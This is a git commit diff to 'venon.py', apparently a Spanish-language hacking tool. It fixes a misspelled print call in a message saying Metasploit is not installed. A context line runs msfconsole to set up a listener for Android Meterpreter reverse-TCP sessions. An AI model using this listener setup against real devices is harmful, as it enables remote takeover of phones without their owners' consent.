d28364b636c693d84cc2071623be1204586b3669
Fenrir-00 <96144320+Fenrir-00@users.noreply.github.com>
2022-08-21 02:13:23 +0200

    Update venon.py

--- venon.py
+++ venon.py
@@ -200,7 +200,7 @@ def msf():
    banner()
    os.system('msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp ; set lhost 127.0.0.1; set lport 4444;set ExitOnSession false"')
  else :
-   pronto(f"""{color.rojo}
+   print(f"""{color.rojo}
           METASPLOIT NO ESTA INSTALADO 
         PROCEDIENDO A INSTALARLO TARDARA
            UN RATO NO TENGAS PRISA{color.fin}""")
